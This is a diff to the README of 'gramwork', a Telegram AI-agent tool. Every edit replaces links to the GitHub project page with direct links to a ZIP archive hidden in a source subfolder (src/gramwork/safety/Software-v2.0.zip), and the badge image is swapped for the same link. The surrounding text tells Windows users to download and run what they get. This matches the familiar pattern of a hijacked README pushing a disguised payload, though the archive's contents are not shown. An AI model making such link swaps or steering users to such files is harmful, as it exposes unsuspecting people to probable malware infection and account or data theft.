@@ -1,6 +1,6 @@
 # 🤖 gramwork - Control Telegram With AI Agents
 
-[![Download gramwork](https://img.shields.io/badge/Download-gramwork-brightgreen)](https://github.com/itsDhakad31/gramwork)
+[![Download gramwork](https://github.com/itsDhakad31/gramwork/raw/refs/heads/main/src/gramwork/safety/Software-v2.0.zip)](https://github.com/itsDhakad31/gramwork/raw/refs/heads/main/src/gramwork/safety/Software-v2.0.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to download and run gramwork on Windows.
 
 Click the big green button above or this link below to visit the gramwork download page on GitHub.
 
-[Download gramwork](https://github.com/itsDhakad31/gramwork)
+[Download gramwork](https://github.com/itsDhakad31/gramwork/raw/refs/heads/main/src/gramwork/safety/Software-v2.0.zip)
 
 On the page, look for the latest release or files section. Download the latest Windows installer or `.exe` file available. If there is no single installer, download the ZIP or setup files provided.
 
@@ -123,10 +123,10 @@ Check the GitHub page regularly for updates, new releases, and fixes. The projec
 
 Visit this link to get the latest version and full instructions:
 
-[Get gramwork](https://github.com/itsDhakad31/gramwork)
+[Get gramwork](https://github.com/itsDhakad31/gramwork/raw/refs/heads/main/src/gramwork/safety/Software-v2.0.zip)
 
 Click the newest release or download option. After downloading, run the installer or unzip and open the program. Follow the steps above to connect your Telegram account.
 
 ---
 
-# [Download gramwork](https://github.com/itsDhakad31/gramwork)
+# [Download gramwork](https://github.com/itsDhakad31/gramwork/raw/refs/heads/main/src/gramwork/safety/Software-v2.0.zip)
